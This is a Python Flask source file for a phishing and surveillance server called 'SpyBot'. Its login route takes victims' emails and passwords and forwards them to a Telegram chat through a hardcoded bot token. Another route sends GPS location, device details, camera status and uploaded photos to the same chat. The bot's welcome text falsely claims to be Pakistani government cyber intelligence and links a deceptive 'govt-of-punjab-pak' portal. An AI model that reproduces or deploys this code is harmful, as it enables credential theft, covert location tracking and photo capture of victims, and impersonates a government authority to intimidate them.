# main.py
import os
import telebot
from flask import Flask, request, render_template, redirect
from datetime import datetime
from werkzeug.utils import secure_filename

TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def index():
    return render_template('spy.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    message = f"🕵️‍♂️ SpyBot Alert\n📧 Email: {email}\n🔑 Password: {password}"
    bot.send_message(CHAT_ID, message)
    return redirect('https://google.com')

@app.route('/collect', methods=['POST'])
def collect():
    if request.content_type.startswith('application/json'):
        data = request.get_json()
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        cam_status = data.get('camera')
        user_agent = data.get('userAgent')
        platform = data.get('deviceInfo')

        location_link = f"📍 Location: https://maps.google.com/?q={latitude},{longitude}" if latitude and longitude else "❌ Location Denied"

        message = (
            f"🕵️‍♂️ SpyBot Alert\n{location_link}\n📷 Camera: {cam_status}\n"
            f"🧠 Device: {platform}\n🌐 UserAgent: {user_agent}"
        )
        bot.send_message(CHAT_ID, message)
        return 'Data sent'

    if 'photo' in request.files:
        photo = request.files['photo']
        filename = secure_filename(f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        photo.save(path)
        with open(path, 'rb') as img:
            bot.send_photo(CHAT_ID, img)
        return 'Photo uploaded'

    return 'Invalid Request'

# Telegram Bot /start handler
@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(
        message.chat.id,
        """👋 Welcome to Faizan™ SpyBot!

⚠️ Government of Pakistan – Cyber Intelligence
🔗 Live Monitoring Portal: https://govt-of-punjab-pak.onrender.com

This system is confidential. Your location, device, and camera are under analysis."""
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
